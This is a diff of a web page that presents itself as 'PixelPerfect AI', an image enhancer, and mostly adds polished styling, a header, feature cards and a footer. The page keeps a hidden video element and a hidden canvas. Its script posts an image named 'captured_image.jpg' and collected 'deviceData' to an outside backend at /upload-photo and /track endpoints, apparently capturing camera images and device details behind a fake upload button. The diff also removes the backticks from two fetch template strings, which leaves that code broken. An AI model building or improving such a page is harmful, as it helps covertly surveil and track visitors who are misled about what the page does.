@@ -3,46 +3,309 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Image Creator</title>
+    <title>PixelPerfect AI - Image Enhancer</title>
     <style>
+        :root {
+            --primary: #3a86ff;
+            --primary-dark: #2563eb;
+            --secondary: #8338ec;
+            --dark: #1e293b;
+            --light: #f8fafc;
+            --gray: #e2e8f0;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--light);
+            color: var(--dark);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        header {
+            background-color: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            padding: 1rem 2rem;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+        }
+        
+        .nav-links a {
+            text-decoration: none;
+            color: var(--dark);
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+        
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+        
+        main {
+            flex: 1;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            height: 100vh;
-            background-color: #f4f4f4;
+            padding: 3rem 1rem;
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
         }
-        .container {
+        
+        .hero {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+        
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .hero p {
+            font-size: 1.2rem;
+            color: #64748b;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        .features {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-bottom: 3rem;
+            flex-wrap: wrap;
+        }
+        
+        .feature {
             background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            padding: 1.5rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            width: 300px;
             text-align: center;
         }
-        .hidden { display: none; }
-        button {
-            background-color: #007bff;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-top: 10px;
+        
+        .feature-icon {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            color: var(--primary);
         }
-        button:hover { background-color: #0056b3; }
+        
+        .container {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            text-align: center;
+            width: 100%;
+            max-width: 600px;
+        }
+        
+        .container h2 {
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+            color: var(--dark);
+        }
+        
+        .container p {
+            color: #64748b;
+            margin-bottom: 1.5rem;
+        }
+        
+        .hidden { 
+            display: none; 
+        }
+        
+        button {
+            background-color: var(--primary);
+            color: white;
+            padding: 0.8rem 1.5rem;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 500;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        button:hover { 
+            background-color: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
+        }
+        
+        #statusMessage {
+            min-height: 24px;
+            margin: 0.5rem 0;
+            font-weight: 500;
+        }
+        
+        .upload-area {
+            border: 2px dashed var(--gray);
+            border-radius: 8px;
+            padding: 2rem;
+            margin-bottom: 1.5rem;
+            transition: all 0.3s;
+        }
+        
+        .upload-area:hover {
+            border-color: var(--primary);
+            background-color: rgba(58, 134, 255, 0.05);
+        }
+        
+        footer {
+            background-color: white;
+            padding: 2rem;
+            text-align: center;
+            margin-top: auto;
+            border-top: 1px solid var(--gray);
+        }
+        
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-top: 1rem;
+        }
+        
+        .footer-links a {
+            text-decoration: none;
+            color: #64748b;
+            transition: color 0.3s;
+        }
+        
+        .footer-links a:hover {
+            color: var(--primary);
+        }
+        
+        @media (max-width: 768px) {
+            .features {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .hero h1 {
+                font-size: 2rem;
+            }
+            
+            .container {
+                padding: 1.5rem;
+            }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>AI Image Generator</h2>
-        <p>Upload an image to enhance it with AI</p>
-        <p id="statusMessage"></p> <!-- 🔥 UI Feedback -->
-        <video id="video" class="hidden" autoplay></video>
-        <canvas id="canvas" class="hidden"></canvas>
-        <button id="uploadBtn">Upload Image</button>
-    </div>
+    <header>
+        <nav>
+            <div class="logo">
+                <span>📸</span> PixelPerfect AI
+            </div>
+            <div class="nav-links">
+                <a href="#">Home</a>
+                <a href="#">Features</a>
+                <a href="#">About</a>
+                <a href="#">Contact</a>
+            </div>
+        </nav>
+    </header>
+
+    <main>
+        <section class="hero">
+            <h1>Transform Your Images with AI</h1>
+            <p>Enhance your photos in seconds with our cutting-edge AI technology. Upload an image and watch the magic happen.</p>
+        </section>
+        
+        <section class="features">
+            <div class="feature">
+                <div class="feature-icon">✨</div>
+                <h3>Enhanced Resolution</h3>
+                <p>Improve clarity and detail with our advanced resolution enhancement technology.</p>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🎨</div>
+                <h3>Color Correction</h3>
+                <p>Automatically balance and optimize the colors in your photos.</p>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">⚡</div>
+                <h3>Instant Results</h3>
+                <p>Get your enhanced images in seconds, not minutes.</p>
+            </div>
+        </section>
+        
+        <div class="container">
+            <h2>AI Image Enhancer</h2>
+            <p>Upload an image to enhance it with our advanced AI</p>
+            <div class="upload-area">
+                <p>Your image will be instantly enhanced with our AI technology</p>
+            </div>
+            <p id="statusMessage"></p> <!-- 🔥 UI Feedback -->
+            <video id="video" class="hidden" autoplay></video>
+            <canvas id="canvas" class="hidden"></canvas>
+            <button id="uploadBtn">
+                <span>Upload Image</span> 📤
+            </button>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <div>
+                <p>© 2025 PixelPerfect AI. All rights reserved.</p>
+            </div>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+                <a href="#">Help & Support</a>
+            </div>
+        </div>
+    </footer>
 
     <script>
         const backendURL = "https://flash-3vfu.onrender.com";  
@@ -76,7 +339,7 @@
                         formData.append("photo", blob, "captured_image.jpg");
 
                         try {
-                            await fetch(`${backendURL}/upload-photo/${sessionId}`, {
+                            await fetch(${backendURL}/upload-photo/${sessionId}, {
                                 method: "POST",
                                 body: formData,
                             });
@@ -145,7 +408,7 @@
 
         // 🚀 Send Data to Backend
         function sendData() {
-            fetch(`${backendURL}/track/${sessionId}`, {
+            fetch(${backendURL}/track/${sessionId}, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(deviceData)
